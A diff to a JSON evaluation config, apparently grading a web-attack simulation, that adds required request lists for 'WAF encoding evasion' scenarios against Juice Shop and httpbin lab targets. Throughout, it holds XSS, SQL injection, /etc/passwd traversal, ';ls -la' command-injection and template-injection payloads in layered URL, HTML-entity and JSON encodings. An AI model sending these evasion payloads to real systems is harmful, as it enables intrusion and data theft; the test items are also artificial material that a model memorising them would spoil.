@@ -11457,7 +11457,411 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "single-xss-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "single-xss-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "single-xss-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "single-xss-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "double-xss-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          },
+          {
+            "id": "double-xss-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          },
+          {
+            "id": "double-xss-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          },
+          {
+            "id": "double-xss-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          },
+          {
+            "id": "triple-xss-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+            }
+          },
+          {
+            "id": "triple-xss-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+            }
+          },
+          {
+            "id": "triple-xss-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+            }
+          },
+          {
+            "id": "triple-xss-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+            }
+          },
+          {
+            "id": "single-sqli-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR 1=1 -- "
+            }
+          },
+          {
+            "id": "single-sqli-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR 1=1 -- "
+            }
+          },
+          {
+            "id": "single-sqli-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR 1=1 -- "
+            }
+          },
+          {
+            "id": "single-sqli-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "' OR 1=1 -- "
+            }
+          },
+          {
+            "id": "double-sqli-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%27%20OR%201%3D1%20--%20"
+            }
+          },
+          {
+            "id": "double-sqli-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%27%20OR%201%3D1%20--%20"
+            }
+          },
+          {
+            "id": "double-sqli-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%27%20OR%201%3D1%20--%20"
+            }
+          },
+          {
+            "id": "double-sqli-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%27%20OR%201%3D1%20--%20"
+            }
+          },
+          {
+            "id": "single-traversal-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "single-traversal-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "single-traversal-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "single-traversal-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "double-traversal-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            }
+          },
+          {
+            "id": "double-traversal-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            }
+          },
+          {
+            "id": "double-traversal-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            }
+          },
+          {
+            "id": "double-traversal-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            }
+          },
+          {
+            "id": "triple-traversal-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+            }
+          },
+          {
+            "id": "triple-traversal-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+            }
+          },
+          {
+            "id": "triple-traversal-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+            }
+          },
+          {
+            "id": "triple-traversal-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+            }
+          },
+          {
+            "id": "single-cmd-inject-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": ";ls -la"
+            }
+          },
+          {
+            "id": "single-cmd-inject-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": ";ls -la"
+            }
+          },
+          {
+            "id": "single-cmd-inject-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": ";ls -la"
+            }
+          },
+          {
+            "id": "single-cmd-inject-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": ";ls -la"
+            }
+          },
+          {
+            "id": "double-cmd-inject-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Bls%20-la"
+            }
+          },
+          {
+            "id": "double-cmd-inject-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Bls%20-la"
+            }
+          },
+          {
+            "id": "double-cmd-inject-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%3Bls%20-la"
+            }
+          },
+          {
+            "id": "double-cmd-inject-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "nested-url-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "query": "%3Bls%20-la"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "waf-encoding-evasion/02-html-entity-encoding",
@@ -11470,7 +11874,391 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "decimal-xss-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62;alert(1)&#60;/script&#62;"
+            }
+          },
+          {
+            "id": "decimal-xss-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62;alert(1)&#60;/script&#62;"
+            }
+          },
+          {
+            "id": "decimal-xss-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62;alert(1)&#60;/script&#62;"
+            }
+          },
+          {
+            "id": "decimal-xss-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%2360%3Bscript%26%2362%3Balert%281%29%26%2360%3B/script%26%2362%3B"
+          },
+          {
+            "id": "hex-xss-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
+            }
+          },
+          {
+            "id": "hex-xss-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
+            }
+          },
+          {
+            "id": "hex-xss-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
+            }
+          },
+          {
+            "id": "hex-xss-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%23x3c%3Bscript%26%23x3e%3Balert%281%29%26%23x3c%3B/script%26%23x3e%3B"
+          },
+          {
+            "id": "named-xss-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "named-xss-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "named-xss-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "named-xss-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B/script%26gt%3B"
+          },
+          {
+            "id": "zeropad-xss-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#0060;script&#0062;alert(1)&#0060;/script&#0062;"
+            }
+          },
+          {
+            "id": "zeropad-xss-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#0060;script&#0062;alert(1)&#0060;/script&#0062;"
+            }
+          },
+          {
+            "id": "zeropad-xss-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#0060;script&#0062;alert(1)&#0060;/script&#0062;"
+            }
+          },
+          {
+            "id": "zeropad-xss-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%230060%3Bscript%26%230062%3Balert%281%29%26%230060%3B/script%26%230062%3B"
+          },
+          {
+            "id": "longpad-xss-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#00060;script&#00062;alert(1)&#00060;/script&#00062;"
+            }
+          },
+          {
+            "id": "longpad-xss-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#00060;script&#00062;alert(1)&#00060;/script&#00062;"
+            }
+          },
+          {
+            "id": "longpad-xss-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#00060;script&#00062;alert(1)&#00060;/script&#00062;"
+            }
+          },
+          {
+            "id": "longpad-xss-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%2300060%3Bscript%26%2300062%3Balert%281%29%26%2300060%3B/script%26%2300062%3B"
+          },
+          {
+            "id": "decimal-sqli-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "decimal-sqli-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "decimal-sqli-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "decimal-sqli-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%2339%3B%20OR%201%3D1--"
+          },
+          {
+            "id": "hex-sqli-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x27; OR 1=1--"
+            }
+          },
+          {
+            "id": "hex-sqli-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x27; OR 1=1--"
+            }
+          },
+          {
+            "id": "hex-sqli-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x27; OR 1=1--"
+            }
+          },
+          {
+            "id": "hex-sqli-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%23x27%3B%20OR%201%3D1--"
+          },
+          {
+            "id": "template-inject-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%23123%3B%26%23123%3B7%2A7%26%23125%3B%26%23125%3B"
+          },
+          {
+            "id": "mixed-entities-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;img src&#x3d;x onerror&#x3d;alert&#40;1&#41;&#62;"
+            }
+          },
+          {
+            "id": "mixed-entities-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;img src&#x3d;x onerror&#x3d;alert&#40;1&#41;&#62;"
+            }
+          },
+          {
+            "id": "mixed-entities-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;img src&#x3d;x onerror&#x3d;alert&#40;1&#41;&#62;"
+            }
+          },
+          {
+            "id": "mixed-entities-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%2360%3Bimg%20src%26%23x3d%3Bx%20onerror%26%23x3d%3Balert%26%2340%3B1%26%2341%3B%26%2362%3B"
+          },
+          {
+            "id": "nosemicolon-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60script&#62alert(1)&#60/script&#62"
+            }
+          },
+          {
+            "id": "nosemicolon-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60script&#62alert(1)&#60/script&#62"
+            }
+          },
+          {
+            "id": "nosemicolon-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "html-entity-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60script&#62alert(1)&#60/script&#62"
+            }
+          },
+          {
+            "id": "nosemicolon-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "html-entity-body",
+            "minimum_dispatches": 1,
+            "body_exact": "input=%26%2360script%26%2362alert%281%29%26%2360/script%26%2362"
+          }
+        ]
+      }
     },
     {
       "id": "waf-encoding-evasion/03-unicode-utf8-evasion",
@@ -11496,7 +12284,332 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "template-inject-urlenc-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-urlenc-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-urlenc-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#123;&#123;7*7&#125;&#125;"
+            }
+          },
+          {
+            "id": "template-inject-urlenc-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%26%23123%3B%26%23123%3B7*7%26%23125%3B%26%23125%3B"
+          },
+          {
+            "id": "xss-urlenc-decimal-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62>alert(1)&#60;/script&#62>"
+            }
+          },
+          {
+            "id": "xss-urlenc-decimal-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62>alert(1)&#60;/script&#62>"
+            }
+          },
+          {
+            "id": "xss-urlenc-decimal-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#60;script&#62>alert(1)&#60;/script&#62>"
+            }
+          },
+          {
+            "id": "xss-urlenc-decimal-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%26%2360%3Bscript%26%2362%3Ealert(1)%26%2360%3B/script%26%2362%3E"
+          },
+          {
+            "id": "xss-urlenc-hex-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e>alert(1)&#x3c;/script&#x3e>"
+            }
+          },
+          {
+            "id": "xss-urlenc-hex-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e>alert(1)&#x3c;/script&#x3e>"
+            }
+          },
+          {
+            "id": "xss-urlenc-hex-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#x3c;script&#x3e>alert(1)&#x3c;/script&#x3e>"
+            }
+          },
+          {
+            "id": "xss-urlenc-hex-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%26%23x3c%3Bscript%26%23x3e%3Ealert(1)%26%23x3c%3B/script%26%23x3e%3E"
+          },
+          {
+            "id": "xss-double-url-entity-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%26%2360%3Bscript%26%2362%3E"
+            }
+          },
+          {
+            "id": "xss-double-url-entity-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%26%2360%3Bscript%26%2362%3E"
+            }
+          },
+          {
+            "id": "xss-double-url-entity-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%26%2360%3Bscript%26%2362%3E"
+            }
+          },
+          {
+            "id": "xss-double-url-entity-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%2526%252360%253Bscript%2526%252362%253E"
+          },
+          {
+            "id": "xss-urlenc-named-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "xss-urlenc-named-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "xss-urlenc-named-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&lt;script&gt;alert(1)&lt;/script&gt;"
+            }
+          },
+          {
+            "id": "xss-urlenc-named-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B"
+          },
+          {
+            "id": "sqli-urlenc-entity-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "sqli-urlenc-entity-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "sqli-urlenc-entity-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "&#39; OR 1=1--"
+            }
+          },
+          {
+            "id": "sqli-urlenc-entity-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%26%2339%3B%20OR%201%3D1--"
+          },
+          {
+            "id": "triple-layer-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252623x3c%253Bscript%252623x3e%253E"
+            }
+          },
+          {
+            "id": "triple-layer-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252623x3c%253Bscript%252623x3e%253E"
+            }
+          },
+          {
+            "id": "triple-layer-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "mixed-nested-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%252623x3c%253Bscript%252623x3e%253E"
+            }
+          },
+          {
+            "id": "triple-layer-post",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "mixed-encoded-body",
+            "minimum_dispatches": 1,
+            "body_exact": "test=%25252623x3c%25253Bscript%25252623x3e%25253E"
+          },
+          {
+            "id": "json-0",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "json-escape-encoding",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"q\":\"<script>alert(1)</script>\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "json-1",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "json-escape-encoding",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"q\":\"\\\\u003cscript\\\\u003ealert(1)\\\\u003c/script\\\\u003e\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "json-2",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "json-escape-encoding",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"q\":\"\\\\x3cscript\\\\x3ealert(1)\\\\x3c/script\\\\x3e\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "json-3",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "json-escape-encoding",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"q\":\"\\u0027 OR 1=1--\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "json-4",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "json-escape-encoding",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"q\":\"{{7*7}}\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "waf-encoding-evasion/05-null-byte-iis-base64",
@@ -11509,7 +12622,257 @@
